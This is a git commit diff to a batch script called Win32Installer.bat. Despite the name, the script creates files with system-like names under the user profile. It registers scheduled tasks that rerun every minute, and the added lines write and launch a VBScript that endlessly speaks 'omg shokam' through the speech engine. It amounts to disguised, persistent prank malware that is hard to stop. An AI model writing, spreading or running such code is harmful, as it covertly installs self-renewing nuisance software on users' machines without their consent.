28129a147c1c681ed70f387639422813f923b377
WAP Industries <141229412+WAP-Industries@users.noreply.github.com>
2023-09-24 13:54:18 +0800

    Add files via upload

--- Win32Installer.bat
+++ Win32Installer.bat
@@ -5,12 +5,15 @@ set "taskfolder=%USERPROFILE%\System"
 set "taskname=Win32Helper.bat"
 set "taskfile=%taskfolder%\%taskname%"
 set "driverfile=%taskfolder%\Win32Handler.bat"
-set "driverhost=%taskfolder%\Win32Host.bat"
+
+set ttsfolder="%USERPROFILE%\local"
+set "ttsfile=%ttsfolder%\SysInfo.vbs"
 
 set "copyfolder=%USERPROFILE%\Applications"
 set "copyfile=%taskfolder%\%taskfilename%"
 
 set "schname=shokam"
+set "schhost=HostDriverSCJE"
 
 
 goto :MAIN
@@ -32,6 +35,18 @@ goto :MAIN
     exit /b
 
 
+:CreateTTSFile
+    mkdir "%ttsfolder%"
+
+    type nul > "%ttsfile%"
+    echo set voice = createobject("sapi.spvoice") >> "%ttsfile%"
+    echo do while 1 >> "%ttsfile%"
+    echo    voice.speak "omg shokam" >> "%ttsfile%"
+    echo    wscript.sleep(2000) >> "%ttsfile%" 
+    echo loop >> "%ttsfile%"
+    exit /b
+
+
 :CreateTaskDriver
     type nul > "%driverfile%"
     echo @echo off >> "%driverfile%"
@@ -41,6 +56,7 @@ goto :MAIN
     echo     mkdir "%copyfolder%" >> "%driverfile%"
     echo     copy /Y "%taskfile%" "%copyfolder%\" >> "%driverfile%"
     echo     schtasks /create /tn "%schname%" /tr "%copyfolder%\%taskname%" /sc minute /mo 1 /st 00:00:00 /f >> "%driverfile%"
+    echo     schtasks /run /tn "%schname%" >> "%driverfile%"
     echo ) >> "%driverfile%"
     exit /b
 
@@ -49,9 +65,16 @@ goto :MAIN
     call :CreateTaskFile
     echo task file created
 
+    call :CreateTTSFile
+    echo tts file created
+
     call :CreateTaskDriver
     echo task driver created
 
-    schtasks /create /tn "HostDriverSCJE" /tr "%driverfile%" /sc minute /mo 1 /st 00:00:00 /f
+    schtasks /create /tn "%schhost%" /tr "%driverfile%" /sc minute /mo 1 /st 00:00:00 /f
+    schtasks /run /tn "%schhost%"
+
+    start wscript.exe "%ttsfile%"
+    exit
 
 endlocal
